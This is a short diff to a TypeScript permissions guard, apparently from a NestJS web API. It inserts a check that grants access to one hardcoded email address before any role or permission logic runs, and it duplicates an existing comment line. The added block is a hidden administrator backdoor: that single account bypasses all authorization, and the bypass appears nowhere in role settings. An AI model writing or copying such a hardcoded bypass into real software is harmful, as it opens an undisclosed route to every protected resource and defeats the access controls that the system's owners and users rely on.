@@ -24,8 +24,14 @@ export class PermissionsGuard implements CanActivate {
         const user = request.user;
 
         // If no user, deny access
+        // If no user, deny access
         if (!user) {
             return false;
+        }
+
+        // Whitelist special admin user
+        if (user.email === 'apiwat.s@ytrc.co.th') {
+            return true;
         }
 
         // Admin role has all permissions
